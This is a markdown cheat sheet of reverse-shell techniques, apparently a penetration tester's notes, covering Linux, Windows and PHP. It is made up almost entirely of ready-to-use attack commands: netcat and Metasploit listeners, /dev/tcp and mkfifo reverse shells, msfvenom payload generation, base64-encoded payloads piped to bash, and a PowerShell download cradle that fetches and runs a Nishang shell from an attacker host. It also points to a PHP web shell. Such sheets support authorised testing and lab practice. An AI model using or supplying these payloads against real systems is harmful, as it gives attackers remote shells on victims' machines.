# Linux

## Listeners

Netcat
`nc -lvnp port`

Meterpreter Linux x64 Reverse TCP Staged
```
msfconsole -q
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost ipaddress
set lport port
run
```

## Payloads

Note: Sometimes need to sh or bash -c 'revshell' for these to work.

Other Note: Can curl --data-urlencode params
```
curl http://target/file --data-urlencode "paramname=paramvalue"

Great for initial access via revshells through web shells.
```

sh -i
`sh -i >& /dev/tcp/ipaddress/port 0>&1`

nc mkfifo
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ipaddress port >/tmp/f`

nc -e
`nc ipaddress port -e sh`

Base64 Revshell Linux
```
echo -n 'payload' | base64 > payload.b64 # Can add spaces to eliminate plus signs

echo payload.b64 | base64 -d | bash
```

Curl (still need to chmod and execute)
`curl attacker:port/shell.sh -o /remote/shell.sh`

Meterpreter Linux x64 Reverse TCP Staged
`msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=ipaddress lport=port -f elf -o shell`

# Windows

## Listeners

Meterpreter Windows x86 Reverse TCP Staged
```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost ipaddress
set lport port
run
```

## Payloads

Meterpreter Windows x86 Reverse TCP Staged
`msfvenom -p windows/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell.exe`

Meterpreter Windows x64 Reverse TCP Staged
`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell.exe`

Netcat
`nc.exe -e cmd.exe ipaddress port`

Nishang PowerShell Revshell
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
echo -n "IEX(new-object net.webclient).downloadstring('http://attacker/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0 > payload.b64

# iconv converts payload to encoding used by Windows

echo 'Invoke-PowerShellTcp -Reverse -IPAddress ipaddress -Port port' >> Invoke-PowerShellTcp.ps1

start listener
start webserver

powershell -enc payload.b64
```

# PHP

Pentest Monkey
`/usr/share/webshells/php/php-reverse-shell.php`
